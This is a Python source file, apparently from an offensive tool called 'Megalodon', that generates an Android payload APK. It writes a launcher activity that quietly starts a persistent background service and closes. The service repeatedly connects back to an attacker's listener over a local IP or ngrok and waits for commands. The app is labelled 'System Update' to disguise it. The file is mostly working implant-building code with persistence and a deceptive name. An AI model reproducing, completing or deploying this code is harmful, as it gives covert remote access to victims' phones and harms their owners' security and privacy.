import os
import json
from pathlib import Path


class AndroidPayloadBuilder:

    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'android' / 'build'
        self.src_dir = Path(__file__).parent.parent.parent / 'payloads' / 'android' / 'src'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.src_dir.mkdir(parents=True, exist_ok=True)
        self.config = self.load_config()
        self.use_ngrok = self.ask_ngrok()

    def load_config(self):
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            try:
                return json.loads(config_file.read_text())
            except Exception:
                return {}
        return {}

    def ask_ngrok(self):
        print("\n🌐 CONNECTION TYPE")
        print("1. Local IP")
        print("2. ngrok")
        choice = input("Select (1 or 2): ").strip()
        return choice == '2'

    def get_listener_ip(self):
        if self.use_ngrok:
            ip = self.config.get('ngrok', {}).get('url')
            if ip:
                return ip
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '0.0.0.0'

    def get_listener_port(self):
        if self.use_ngrok:
            port = self.config.get('ngrok', {}).get('port')
            if port:
                return port
        return self.config.get('listener', {}).get('port', 4444)

    def _java_activity(self):
        return '''package com.megalodon.payload;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {

    private void log(String msg) {
        Log.d("Megalodon", msg);
        try {
            FileWriter fw = new FileWriter(new File("/sdcard/megalodon_debug.txt"), true);
            String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            fw.write("[" + ts + "] ACT: " + msg + "\\n");
            fw.close();
        } catch (Exception e) {}
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        log("Activity onCreate");

        try {
            Intent svc = new Intent(this, PayloadService.class);
            svc.setAction("START");
            startService(svc);
            log("startService returned OK");
        } catch (Exception e) {
            log("startService THREW: " + e.getMessage());
        }

        finish();
    }
}
'''

    def _java_service(self):
        return '''package com.megalodon.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class PayloadService extends Service {
    private static final String IP = "__IP__";
    private static final int PORT = __PORT__;
    private static final String LOG = "/sdcard/megalodon_debug.txt";

    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private volatile boolean running = true;

    private void log(String msg) {
        Log.d("Megalodon", msg);
        try {
            FileWriter fw = new FileWriter(new File(LOG), true);
            String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            fw.write("[" + ts + "] SVC: " + msg + "\\n");
            fw.close();
        } catch (Exception e) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        log("Service onCreate");
        new Thread(new Runnable() {
            @Override
            public void run() {
                log("Thread started");
                connectLoop();
            }
        }).start();
    }

    private void connectLoop() {
        while (running) {
            try {
                log("Connecting to " + IP + ":" + PORT);
                socket = new Socket(IP, PORT);
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);
                log("CONNECTED");

                in = new DataInputStream(socket.getInputStream());
                out = new DataOutputStream(socket.getOutputStream());

                out.writeUTF("MEGALODON_READY");
                out.flush();
                log("Handshake sent");

                while (running && !socket.isClosed()) {
                    try {
                        String cmd = in.readUTF();
                        log("Command: " + cmd);
                        if (cmd.equals("ping")) {
                            out.writeUTF("PONG");
                            out.flush();
                            log("PONG sent");
                        }
                    } catch (Exception e) {
                        log("Read error: " + e.getMessage());
                        break;
                    }
                }
            } catch (Exception e) {
                log("Connect error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            } finally {
                try { if (socket != null) socket.close(); } catch (Exception e) {}
                socket = null;
                log("Socket closed, will retry in 5s");
            }

            if (running) {
                try { Thread.sleep(5000); } catch (InterruptedException e) {}
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("onStartCommand called");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        log("Service onDestroy");
        running = false;
        try { if (socket != null) socket.close(); } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
'''

    def generate_activity(self):
        return self._java_activity()

    def generate_service(self):
        body = self._java_service()
        body = body.replace('__IP__', self.get_listener_ip())
        body = body.replace('__PORT__', str(self.get_listener_port()))
        return body

    def generate_manifest(self):
        return '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.megalodon.payload"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <application android:label="System Update" android:allowBackup="true">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".PayloadService" android:exported="false" />
    </application>
</manifest>'''

    def generate_apktool_yml(self):
        return '''version: 2.7.0
apkFileName: megalodon.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
sdkInfo:
  minSdkVersion: '21'
  targetSdkVersion: '30'
'''

    def build_apk(self):
        print("[*] Building SERVICE-BASED test payload...")

        src_dir = self.src_dir / 'com' / 'megalodon' / 'payload'
        src_dir.mkdir(parents=True, exist_ok=True)

        with open(src_dir / 'MainActivity.java', 'w') as f:
            f.write(self.generate_activity())
        with open(src_dir / 'PayloadService.java', 'w') as f:
            f.write(self.generate_service())
        with open(self.output_dir / 'AndroidManifest.xml', 'w') as f:
            f.write(self.generate_manifest())
        with open(self.output_dir / 'apktool.yml', 'w') as f:
            f.write(self.generate_apktool_yml())

        print("[+] Listener IP: " + str(self.get_listener_ip()))
        print("[+] Listener Port: " + str(self.get_listener_port()))

        return {
            'success': True,
            'listener_ip': self.get_listener_ip(),
            'listener_port': self.get_listener_port()
        }


def build():
    builder = AndroidPayloadBuilder()
    return builder.build_apk()
